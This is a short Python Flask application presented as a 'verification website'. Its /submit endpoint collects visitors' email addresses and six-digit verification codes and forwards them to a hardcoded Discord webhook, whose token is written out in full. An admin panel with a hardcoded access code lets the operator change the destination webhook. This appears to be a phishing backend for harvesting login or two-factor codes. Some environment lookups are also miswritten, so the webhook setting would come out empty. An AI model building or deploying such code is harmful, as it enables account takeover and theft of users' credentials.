from flask import Flask, render_template, request, session, redirect, jsonify
import os, requests

app = Flask(__name__)
app.secret_key = os.environ.get("verificationwebsite", "change_this")

ADMIN_CODE = os.environ.get("125388722", "125388722")
WEBHOOK_URL = os.environ.get("https://discord.com/api/webhooks/1458185599688114309/X9TaZmu-EfBWAHNAv8DLennJgDm2QUYnCeIxxruMIdf9BLqj1CSxRsP09NxOBLr7Sm_u")

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/submit", methods=["POST"])
def submit():
    data = request.get_json()
    email = data.get("email", "").strip()
    code = data.get("code", "").strip()

    # Code validation
    if code:
        if not code.isdigit() or len(code) != 6:
            return jsonify({"error": "Verification failed"}), 400

    # Send to webhook
    requests.post(WEBHOOK_URL, json={
        "content": f"Email: {email}\nCode: {code or 'N/A'}"
    })

    return jsonify({"ok": True})

# Admin Panel
@app.route("/panel")
def panel():
    return render_template("panel.html")

@app.route("/admin/login", methods=["POST"])
def admin_login():
    if request.form.get("code") == ADMIN_CODE:
        session["admin"] = True
        return redirect("/admin/dashboard")
    return "Access denied", 403

@app.route("/admin/dashboard")
def dashboard():
    if not session.get("admin"):
        return redirect("/panel")
    return render_template("dashboard.html")

@app.route("/admin/webhook", methods=["POST"])
def update_webhook():
    global WEBHOOK_URL
    if not session.get("admin"):
        return "Unauthorized", 403

    new_hook = request.form.get("webhook")
    if not new_hook.startswith("https://discord.com/api/webhooks/"):
        return "Invalid webhook", 400

    WEBHOOK_URL = new_hook
    return redirect("/admin/dashboard")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
